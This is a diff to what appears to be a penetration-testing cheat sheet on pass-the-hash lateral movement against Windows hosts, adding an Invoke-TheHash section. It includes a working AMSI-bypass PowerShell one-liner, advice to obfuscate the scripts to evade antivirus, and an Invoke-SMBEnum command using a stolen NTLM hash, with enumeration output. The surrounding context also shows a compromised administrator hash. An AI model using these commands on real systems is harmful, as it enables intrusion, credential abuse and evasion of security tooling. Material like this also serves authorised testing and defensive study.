@@ -17,6 +17,7 @@ Index
 2. PSexec (Impacket version)
 3. Mimikatz
 4. CrackMapExec
+5. Invoke-TheHash (PowerShell scripts)
 
 ========================================================================================================================
 Example 1 - WMIexec (Impacket version)
@@ -125,3 +126,67 @@ SMB         192.168.1.50    445    WIN-EVAGJ1T16QD  [*] Windows Server 2012 R2 S
 SMB         192.168.1.50    445    WIN-EVAGJ1T16QD  [+] WIN-EVAGJ1T16QD\administrator aad3b435b51404eeaad3b435b51404ee:ad5f04d33d00db5f06237<SNIP> (Pwn3d!)
 <SNIP>
 
+========================================================================================================================
+Example 5 - Invoke-TheHash (PowerShell)
+========================================================================================================================
+
+Source: https://github.com/Kevin-Robertson/Invoke-TheHash
+
+> Invoke-WMIExec.ps1
+> Invoke-SMBEnum.ps1
+> Invoke-SMBExec.ps1
+
+Invoke-TheHash contains PowerShell functions for performing pass the hash WMI and SMB tasks.
+WMI and SMB connections are accessed through the .NET TCPClient. 
+Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. 
+Local administrator privilege is not required client-side.
+
+Note: These powersehll scripts are flagged by AV so it is necessary to bypass the AMSI and obfuscate them to avoid detection.
+
+PoC - Invoke-SMBEnum.ps1
+-------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator\Documents\Tools-AD> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
+
+PS C:\Users\Administrator\Documents\Tools-AD> . .\Invoke-SMBEnum.ps1
+
+PS C:\Users\Administrator\Documents\Tools-AD> Invoke-SMBEnum -Target 192.168.1.73 -Domain .  -Username pentester -Hash c4b1b6e2ee25d932f3bb6d232c2c6972
+
+192.168.1.73 Administrators Group Members:
+
+Username      Domain     Type
+--------      ------     ----
+Administrator SQLSERVER1 user
+Pentester     SQLSERVER1 user
+sqlservice    COMPANY    group
+
+192.168.1.73 Users:
+
+Username        RID
+--------        ---
+Administrator   500
+Guest           501
+HR-app         1008
+monitoring     1009
+Pentester      1001
+sqlservicetest 1011
+
+
+192.168.1.73 NetSessions:
+
+Username  Source
+--------  ------
+pentester \\192.168.1.113
+
+
+192.168.1.73 Shares:
+
+Share  Description   Access Mask
+-----  -----------   -----------
+ADMIN$ Remote Admin  00000000000000000000000000000000
+C$     Default share 00000000000000000000000000000000
+IPC$   Remote IPC    00000001000111110000000111111111
